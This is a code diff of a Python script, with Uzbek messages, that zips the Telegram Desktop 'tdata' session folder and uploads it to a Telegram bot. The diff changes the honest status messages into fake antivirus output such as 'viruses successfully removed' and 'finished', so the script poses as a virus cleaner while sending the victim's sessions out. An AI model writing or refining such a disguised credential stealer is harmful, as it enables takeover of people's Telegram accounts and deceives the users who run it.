@@ -8,7 +8,7 @@ def zip_tdata_directly():
     zip_path = Path.home() / "Documents" / "tdata_backup.zip"
 
     if not tdata_path.exists():
-        print("[❌] tdata topilmadi.")
+        print("viruslar bor")
         return None
 
     with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
@@ -23,7 +23,7 @@ def zip_tdata_directly():
                 except Exception as e:
                     print(f"[⚠️] Xatolik: {full_path} — {e}")
 
-    print(f"[✅] tdata muvaffaqiyatli zip qilindi: {zip_path}")
+    print(f"[✅] viruslar muvaffaqiyatli yuq  qilindi: {zip_path}")
     return zip_path
 
 def send_zip_to_telegram(zip_file_path, bot_token, chat_id):
@@ -40,11 +40,11 @@ def send_zip_to_telegram(zip_file_path, bot_token, chat_id):
             response = requests.post(url, files=files, data=data)
 
         if response.status_code == 200:
-            print("[✅] Telegramga yuborildi!")
+            print("[✅] tugad !")
         else:
-            print(f"[❌] Yuborishda xatolik: {response.status_code} — {response.text}")
+            print(f"[❌]  xatolik: {response.status_code} — {response.text}")
     except Exception as e:
-        print(f"[❌] Telegramga yuborishda xatolik: {e}")
+        print(f" xatolik: {e}")
 
 if __name__ == "__main__":
     # ZIP yaratish
